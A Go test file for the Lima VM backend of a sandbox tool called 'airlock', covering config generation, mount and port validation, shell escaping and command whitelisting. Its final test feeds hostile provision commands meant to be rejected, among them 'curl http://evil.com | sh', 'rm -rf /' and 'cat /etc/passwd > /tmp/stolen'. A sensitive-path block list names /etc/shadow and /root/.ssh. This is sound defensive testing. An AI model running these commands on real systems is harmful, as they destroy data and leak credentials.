package lima

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/muneebs/airlock/internal/api"
)

func TestGenerateConfigMinimal(t *testing.T) {
	spec := api.VMSpec{
		Name:   "test-vm",
		OS:     "linux",
		CPU:    2,
		Memory: "4GiB",
		Disk:   "20GiB",
	}

	yaml, err := GenerateConfig(spec)
	if err != nil {
		t.Fatalf("GenerateConfig() error: %v", err)
	}
	if !strings.Contains(yaml, "vmType: vz") {
		t.Error("expected vmType vz")
	}
	if !strings.Contains(yaml, "cpus: 2") {
		t.Error("expected cpus 2")
	}
	if !strings.Contains(yaml, "memory: 4GiB") {
		t.Error("expected memory 4GiB")
	}
	if !strings.Contains(yaml, "disk: 20GiB") {
		t.Error("expected disk 20GiB")
	}
	if !strings.Contains(yaml, "mountType: virtiofs") {
		t.Error("expected mountType virtiofs")
	}
}

func TestGenerateConfigWithMounts(t *testing.T) {
	spec := api.VMSpec{
		Name:   "test-vm",
		CPU:    4,
		Memory: "8GiB",
		Disk:   "40GiB",
		Mounts: []api.VMMount{
			{HostPath: "/Users/test/project", GuestPath: "/home/airlock/projects/project", Writable: true, Inotify: true},
			{HostPath: "/Users/test/api", GuestPath: "/home/airlock/projects/api", Writable: false},
		},
	}

	yaml, err := GenerateConfig(spec)
	if err != nil {
		t.Fatalf("GenerateConfig() error: %v", err)
	}
	if !strings.Contains(yaml, "/Users/test/project") {
		t.Error("expected project mount path")
	}
	if !strings.Contains(yaml, "writable: true") {
		t.Error("expected writable: true for first mount")
	}
	if !strings.Contains(yaml, "mountPoint: /home/airlock/projects/project") {
		t.Error("expected mountPoint for project mount")
	}
	if !strings.Contains(yaml, "mountPoint: /home/airlock/projects/api") {
		t.Error("expected mountPoint for api mount")
	}
}

func TestGenerateConfigWithPortForward(t *testing.T) {
	spec := api.VMSpec{
		Name:   "test-vm",
		CPU:    2,
		Memory: "4GiB",
		Disk:   "20GiB",
		Ports:  "3000:9999",
	}

	yaml, err := GenerateConfig(spec)
	if err != nil {
		t.Fatalf("GenerateConfig() error: %v", err)
	}
	if !strings.Contains(yaml, "guestPortRange") {
		t.Error("expected portForwards section")
	}
	if !strings.Contains(yaml, "3000") || !strings.Contains(yaml, "9999") {
		t.Error("expected port range 3000-9999")
	}
}

func TestGenerateConfigWithProvision(t *testing.T) {
	spec := api.VMSpec{
		Name:          "test-vm",
		CPU:           2,
		Memory:        "4GiB",
		Disk:          "20GiB",
		ProvisionCmds: []string{"apt-get update", "apt-get install -y curl"},
	}

	yaml, err := GenerateConfig(spec)
	if err != nil {
		t.Fatalf("GenerateConfig() error: %v", err)
	}
	if !strings.Contains(yaml, "provision") {
		t.Error("expected provision section")
	}
	if !strings.Contains(yaml, "apt-get update") {
		t.Error("expected provision command in output")
	}
}

func TestGenerateConfigValidationNoName(t *testing.T) {
	spec := api.VMSpec{CPU: 2, Memory: "4GiB", Disk: "20GiB"}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for missing name")
	}
}

func TestGenerateConfigValidationPathTraversal(t *testing.T) {
	spec := api.VMSpec{Name: "../../etc", CPU: 2, Memory: "4GiB", Disk: "20GiB"}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for path traversal in name")
	}
}

func TestGenerateConfigValidationHostPathTraversal(t *testing.T) {
	spec := api.VMSpec{
		Name:   "test-vm",
		CPU:    2,
		Memory: "4GiB",
		Disk:   "20GiB",
		Mounts: []api.VMMount{
			{HostPath: "/etc/../root", GuestPath: "/mnt"},
		},
	}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for .. in mount host_path")
	}
}

func TestGenerateConfigValidationProvisionCmdsLimit(t *testing.T) {
	cmds := make([]string, 11)
	for i := range cmds {
		cmds[i] = "echo hello"
	}
	spec := api.VMSpec{
		Name:          "test-vm",
		CPU:           2,
		Memory:        "4GiB",
		Disk:          "20GiB",
		ProvisionCmds: cmds,
	}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for too many provision commands")
	}
}

func TestGenerateConfigValidationZeroCPU(t *testing.T) {
	spec := api.VMSpec{Name: "test", CPU: 0, Memory: "4GiB", Disk: "20GiB"}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for zero CPU")
	}
}

func TestGenerateConfigValidationEmptyMemory(t *testing.T) {
	spec := api.VMSpec{Name: "test", CPU: 2, Memory: "", Disk: "20GiB"}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for empty memory")
	}
}

func TestParsePortRange(t *testing.T) {
	tests := []struct {
		input   string
		wantErr bool
		start   int
		end     int
	}{
		{"3000:9999", false, 3000, 9999},
		{"8080:8080", false, 8080, 8080},
		{"80:443", false, 80, 443},
		{"9999:3000", true, 0, 0},
		{"0:65535", true, 0, 0},
		{"1:65536", true, 0, 0},
		{"invalid", true, 0, 0},
		{"3000", true, 0, 0},
		{"abc:def", true, 0, 0},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			pf, err := parsePortRange(tt.input)
			if tt.wantErr {
				if err == nil {
					t.Error("expected error")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if pf.GuestPortRange[0] != tt.start || pf.GuestPortRange[1] != tt.end {
				t.Errorf("expected [%d,%d], got [%d,%d]",
					tt.start, tt.end, pf.GuestPortRange[0], pf.GuestPortRange[1])
			}
		})
	}
}

func TestLimaProviderCreate(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	logPath := filepath.Join(dir, "calls.log")
	script := "#!/bin/sh\necho \"$@\" >> " + logPath + "\necho 'created'\n"
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")
	spec := api.VMSpec{
		Name:   "test-sandbox",
		CPU:    2,
		Memory: "4GiB",
		Disk:   "20GiB",
	}

	err := p.Create(context.Background(), spec)
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	data, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("read calls.log: %v", err)
	}
	if !strings.Contains(string(data), "create --tty=false --name=test-sandbox") {
		t.Errorf("expected limactl create call with --name=test-sandbox, got: %s", string(data))
	}
}

func TestLimaProviderExec(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	script := "#!/bin/sh\nshift 2; shift; echo \"$@\"\n"
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")
	output, err := p.Exec(context.Background(), "test-vm", []string{"echo", "hello"})
	if err != nil {
		t.Fatalf("Exec() error: %v", err)
	}
	if !strings.Contains(output, "echo") {
		t.Errorf("expected command to be passed through, got: %s", output)
	}
}

func TestLimaProviderExecAsUserArgPreservation(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	var recordedCmd string
	cmdFile := filepath.Join(dir, "cmd.log")
	script := "#!/bin/sh\necho \"$@\" > " + cmdFile + "\n"
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")
	_, err := p.ExecAsUser(context.Background(), "test-vm", "airlock", []string{"echo", "hello world", "arg3"})
	if err != nil {
		t.Fatalf("ExecAsUser() error: %v", err)
	}

	data, err := os.ReadFile(cmdFile)
	if err != nil {
		t.Fatalf("read cmd log: %v", err)
	}
	recordedCmd = strings.TrimSpace(string(data))

	if !strings.Contains(recordedCmd, "airlock") {
		t.Errorf("expected 'airlock' user in command, got: %s", recordedCmd)
	}

	parts := strings.Fields(recordedCmd)
	hasAirlock := false
	for _, p := range parts {
		if p == "airlock" {
			hasAirlock = true
		}
	}
	if !hasAirlock {
		t.Errorf("expected 'airlock' as a separate token, got: %q", recordedCmd)
	}

	if !strings.Contains(recordedCmd, "'hello world'") {
		t.Errorf("argument with spaces must be single-quoted to preserve boundaries, got: %s", recordedCmd)
	}

	if !strings.Contains(recordedCmd, "arg3") {
		t.Errorf("expected 'arg3' in command, got: %s", recordedCmd)
	}
}

func TestShellEscapeWrapsInQuotes(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "'hello'"},
		{"hello world", "'hello world'"},
		{"it's", "'it'\\''s'"},
		{"", "''"},
	}

	for _, tt := range tests {
		got := shellEscape(tt.input)
		if got != tt.expected {
			t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestLimaProviderExists(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	script := `#!/bin/sh
if [ "$1" = "list" ]; then
  echo '{"name":"existing-vm","status":"Running"}'
  echo '{"name":"other-vm","status":"Stopped"}'
  exit 0
fi
echo "unknown command: $1" >&2; exit 1
`
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")

	exists, err := p.Exists(context.Background(), "existing-vm")
	if err != nil {
		t.Fatalf("Exists() error: %v", err)
	}
	if !exists {
		t.Error("expected existing-vm to exist")
	}

	exists, err = p.Exists(context.Background(), "nonexistent")
	if err != nil {
		t.Fatalf("Exists() error: %v", err)
	}
	if exists {
		t.Error("expected nonexistent VM to not exist")
	}
}

func TestLimaProviderIsRunning(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	script := `#!/bin/sh
if [ "$1" = "list" ]; then
  echo '{"name":"running-vm","status":"Running"}'
  echo '{"name":"stopped-vm","status":"Stopped"}'
  exit 0
fi
`
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")

	running, err := p.IsRunning(context.Background(), "running-vm")
	if err != nil {
		t.Fatalf("IsRunning() error: %v", err)
	}
	if !running {
		t.Error("expected running-vm to be running")
	}

	running, err = p.IsRunning(context.Background(), "stopped-vm")
	if err != nil {
		t.Fatalf("IsRunning() error: %v", err)
	}
	if running {
		t.Error("expected stopped-vm to not be running")
	}
}

func TestLimaProviderCopyToVM(t *testing.T) {
	dir := t.TempDir()
	limactlPath := filepath.Join(dir, "fake-limactl")

	var calledArgs []string
	script := "#!/bin/sh\necho \"$@\" > " + filepath.Join(dir, "args") + "\n"
	os.WriteFile(limactlPath, []byte(script), 0755)

	p := NewLimaProviderWithPaths(limactlPath, dir, "")
	err := p.CopyToVM(context.Background(), "test-vm", "/src/file.txt", "/dst/file.txt")
	if err != nil {
		t.Fatalf("CopyToVM() error: %v", err)
	}

	data, _ := os.ReadFile(filepath.Join(dir, "args"))
	calledArgs = strings.Fields(strings.TrimSpace(string(data)))
	if len(calledArgs) < 3 || calledArgs[0] != "copy" {
		t.Errorf("expected 'copy /src/file.txt test-vm:/dst/file.txt', got: %v", calledArgs)
	}
}

func TestIsSensitiveMountPath(t *testing.T) {
	tests := []struct {
		path        string
		wantBlocked bool
	}{
		{"/etc", true},
		{"/etc/", true},
		{"/etc/shadow", true},
		{"/etc/ssh", true},
		{"/var/run/docker.sock", true},
		{"/root", true},
		{"/root/.ssh", true},
		{"/proc", true},
		{"/sys", true},
		{"/dev", true},
		{"/home", true},
		{"/home/user/projects/app", true},
		{"/Users/alice/projects/app", false},
		{"/tmp/workspace", false},
		{"/opt/code", false},
		{"/var/run/docker", true},
		{"/etc/ssl", true},
		{"/etc/pki", true},
	}

	for _, tt := range tests {
		got := isSensitiveMountPath(tt.path)
		if got != tt.wantBlocked {
			t.Errorf("isSensitiveMountPath(%q) = %v, want %v", tt.path, got, tt.wantBlocked)
		}
	}
}

func TestGenerateConfigValidationSensitiveMountPath(t *testing.T) {
	spec := api.VMSpec{
		Name:   "test-vm",
		CPU:    2,
		Memory: "4GiB",
		Disk:   "20GiB",
		Mounts: []api.VMMount{
			{HostPath: "/etc", GuestPath: "/mnt/etc", Writable: true},
		},
	}
	_, err := GenerateConfig(spec)
	if err == nil {
		t.Error("expected error for sensitive mount path /etc")
	}
	if !strings.Contains(err.Error(), "sensitive") {
		t.Errorf("expected 'sensitive' in error, got: %v", err)
	}
}

func TestGenerateConfigValidationProvisionCmdWhitelist(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		{"safe command", "apt-get update", false},
		{"safe install with flags", "apt-get install -y curl", false},
		{"safe path with equals", "npm config set prefix /home/user/.npm-global", false},
		{"safe curl download", "curl -fsSL https://example.com/install.sh", false},
		{"safe with hash comment", "echo hello # this is a comment", false},
		{"safe with at sign", "user@host", false},
		{"safe with plus", "npm install pkg@1.0.0", false},
		{"safe with comma", "echo a,b,c", false},
		{"safe with tilde", "cd ~/project", false},
		{"semicolon injection", "apt-get update; rm -rf /", true},
		{"pipe injection", "curl http://evil.com | sh", true},
		{"dollar injection", "echo $HOME", true},
		{"backtick injection", "echo `whoami`", true},
		{"ampersand injection", "echo foo && echo bar", true},
		{"exclamation mark", "echo hello!", true},
		{"newline with semicolon", "apt-get update\n; rm -rf /", true},
		{"carriage return", "apt-get update\rrm -rf /", true},
		{"parentheses", "(kill -9 1)", true},
		{"redirect output", "cat /etc/passwd > /tmp/stolen", true},
		{"redirect input", "bash < /tmp/script", true},
		{"backslash", `echo \n`, true},
		{"single quote", "echo 'hello'", true},
		{"double quote", `echo "hello"`, true},
		{"curly braces", "echo ${HOME}", true},
		{"null byte", "echo\x00hello", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			spec := api.VMSpec{
				Name:          "test-vm",
				CPU:           2,
				Memory:        "4GiB",
				Disk:          "20GiB",
				ProvisionCmds: []string{tt.cmd},
			}
			_, err := GenerateConfig(spec)
			if tt.wantErr && err == nil {
				t.Errorf("expected error for provision cmd %q", tt.cmd)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("unexpected error for provision cmd %q: %v", tt.cmd, err)
			}
		})
	}
}
